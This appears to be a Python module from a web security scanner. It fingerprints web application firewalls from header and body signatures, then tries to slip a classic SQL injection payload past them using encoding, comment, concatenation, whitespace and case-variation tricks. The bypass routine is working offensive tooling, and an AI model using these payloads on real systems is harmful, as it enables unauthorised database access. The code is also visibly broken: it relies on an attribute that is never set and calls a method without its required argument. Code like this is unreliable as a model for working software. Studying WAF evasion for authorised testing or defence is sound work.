#!/usr/bin/env python3

import re
from typing import Dict, Any, List
import logging
from .request_engine import RequestEngine

class WAFDetector:
    def __init__(self):
        """Initialize WAF detector with common WAF signatures."""
        self.waf_signatures = {
            "cloudflare": [
                r"cloudflare",
                r"cf-ray",
                r"cf-cache-status"
            ],
            "modsecurity": [
                r"mod_security",
                r"modsecurity",
                r"blocked by mod_security"
            ],
            "akamai": [
                r"akamai",
                r"akamai-gtm"
            ],
            "imperva": [
                r"incapsula",
                r"imperva"
            ],
            "f5": [
                r"f5",
                r"bigip"
            ]
        }
        
    def detect(self, request_engine: RequestEngine) -> Dict[str, Any]:
        """Detect WAF presence and type."""
        try:
            # Send test request
            response, _ = request_engine.send_request()
            
            if not response:
                return {"detected": False, "type": "unknown"}
                
            # Check headers for WAF signatures
            headers = response.headers
            detected_wafs = []
            
            for waf_type, signatures in self.waf_signatures.items():
                for signature in signatures:
                    for header_name, header_value in headers.items():
                        if re.search(signature, header_name.lower()) or re.search(signature, header_value.lower()):
                            detected_wafs.append(waf_type)
                            break
                            
            # Check response body for WAF signatures
            body = response.text.lower()
            for waf_type, signatures in self.waf_signatures.items():
                for signature in signatures:
                    if re.search(signature, body):
                        if waf_type not in detected_wafs:
                            detected_wafs.append(waf_type)
                            
            return {
                "detected": len(detected_wafs) > 0,
                "type": detected_wafs[0] if detected_wafs else "unknown",
                "all_types": detected_wafs
            }
            
        except Exception as e:
            logging.error(f"WAF detection failed: {str(e)}")
            return {"detected": False, "type": "unknown"}

    def test_waf_bypass(self) -> List[Dict[str, Any]]:
        """Test various WAF bypass techniques."""
        bypass_results = []
        
        # Test different encoding techniques
        encoding_tests = [
            ("URL encoding", lambda x: x.replace("'", "%27").replace(" ", "%20")),
            ("Double URL encoding", lambda x: x.replace("'", "%2527").replace(" ", "%2520")),
            ("Hex encoding", lambda x: x.replace("'", "0x27").replace(" ", "0x20")),
            ("Unicode encoding", lambda x: x.replace("'", "u0027").replace(" ", "u0020")),
            ("HTML encoding", lambda x: x.replace("'", "&#39;").replace(" ", "&#32;"))
        ]
        
        # Test different comment styles
        comment_tests = [
            ("MySQL comments", lambda x: x + " --"),
            ("MySQL comments with space", lambda x: x + " -- "),
            ("MySQL comments with newline", lambda x: x + " --\n"),
            ("MySQL comments with hash", lambda x: x + " #"),
            ("MySQL comments with hash and space", lambda x: x + " # "),
            ("MySQL comments with hash and newline", lambda x: x + " #\n")
        ]
        
        # Test different string concatenation
        concat_tests = [
            ("MySQL concat", lambda x: x.replace("'", "CONCAT(CHAR(39))")),
            ("PostgreSQL concat", lambda x: x.replace("'", "CHR(39)")),
            ("MSSQL concat", lambda x: x.replace("'", "CHAR(39)"))
        ]
        
        # Test different whitespace techniques
        whitespace_tests = [
            ("Tab", lambda x: x.replace(" ", "\t")),
            ("Newline", lambda x: x.replace(" ", "\n")),
            ("Carriage return", lambda x: x.replace(" ", "\r")),
            ("Form feed", lambda x: x.replace(" ", "\f")),
            ("Vertical tab", lambda x: x.replace(" ", "\v")),
            ("Multiple spaces", lambda x: x.replace(" ", "  "))
        ]
        
        # Test different case variations
        case_tests = [
            ("Uppercase", lambda x: x.upper()),
            ("Lowercase", lambda x: x.lower()),
            ("Mixed case", lambda x: ''.join(c.upper() if i % 2 == 0 else c.lower() for i, c in enumerate(x)))
        ]
        
        # Combine all tests
        all_tests = encoding_tests + comment_tests + concat_tests + whitespace_tests + case_tests
        
        # Test each technique
        for test_name, transform_func in all_tests:
            try:
                # Get a basic SQL injection payload
                payload = "' OR '1'='1"
                transformed_payload = transform_func(payload)
                
                # Send request with transformed payload
                response, _ = self.request_engine.send_request(payload=transformed_payload)
                if not response:
                    continue
                    
                # Check if the request was successful (not blocked by WAF)
                if response.status_code == 200:
                    bypass_results.append({
                        "technique": test_name,
                        "payload": transformed_payload,
                        "status": "success",
                        "status_code": response.status_code
                    })
                    
            except Exception as e:
                logging.error(f"Error testing WAF bypass technique {test_name}: {str(e)}")
                continue
                
        return bypass_results
        
    def get_waf_info(self) -> Dict[str, Any]:
        """Get detailed WAF information."""
        waf_detection = self.detect()
        bypass_results = self.test_waf_bypass()
        
        return {
            "detection": waf_detection,
            "bypass_techniques": bypass_results,
            "recommendations": self._get_waf_recommendations(waf_detection)
        }
        
    def _get_waf_recommendations(self, waf_detection: Dict[str, Any]) -> List[str]:
        """Get recommendations based on WAF detection results."""
        recommendations = []
        
        if not waf_detection["detected"]:
            recommendations.append("No WAF detected. Consider implementing a WAF for better security.")
            return recommendations
            
        waf_type = waf_detection["type"]
        
        if waf_type == "modsecurity":
            recommendations.extend([
                "ModSecurity detected. Consider updating to the latest version.",
                "Review ModSecurity rules and adjust sensitivity if needed.",
                "Enable ModSecurity audit logging for better monitoring."
            ])
        elif waf_type == "cloudflare":
            recommendations.extend([
                "Cloudflare WAF detected. Consider enabling additional security features.",
                "Review Cloudflare security settings and rules.",
                "Enable Cloudflare logging for better monitoring."
            ])
        elif waf_type == "imperva":
            recommendations.extend([
                "Imperva WAF detected. Consider updating to the latest version.",
                "Review Imperva security policies and rules.",
                "Enable Imperva logging for better monitoring."
            ])
        else:
            recommendations.append(f"Consider reviewing {waf_type} WAF configuration and rules.")
            
        return recommendations 
